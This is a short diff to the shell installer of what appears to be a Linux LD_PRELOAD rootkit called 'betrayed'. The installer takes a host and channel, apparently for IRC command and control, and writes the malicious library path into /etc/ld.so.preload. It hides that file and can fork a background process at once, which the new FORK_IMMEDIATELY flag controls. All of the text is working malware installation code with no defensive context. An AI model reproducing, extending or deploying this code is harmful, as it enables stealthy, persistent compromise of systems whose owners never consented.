@@ -6,6 +6,10 @@ usage(){ echo "  [..] usage: $0 <host> '<channel>'"; exit; }
 [ -z $1 ] && usage;
 [ -z $2 ] && usage;
 
+# comment this out/change to 0 and we won't create the fork
+# process straight away.
+FORK_IMMEDIATELY=1
+
 CONF_H="src/config.h"
 PRELOAD="/etc/ld.so.preload"
 
@@ -70,7 +74,7 @@ install_btrayed(){
     touch $PRELOAD && hidepath $PRELOAD
 
     echo $SOPATH > $PRELOAD || { echo "  [-] couldn't write \$SOPATH to $PRELOAD"; exit; }
-    cat /dev/null # start fork process now
+    [ "$FORK_IMMEDIATELY" == 1 ] && cat /dev/null # start fork process now
 
     echo "  [+] betrayed successfully installed"
     echo "  [+] eee $HOST ($CHANNEL)"
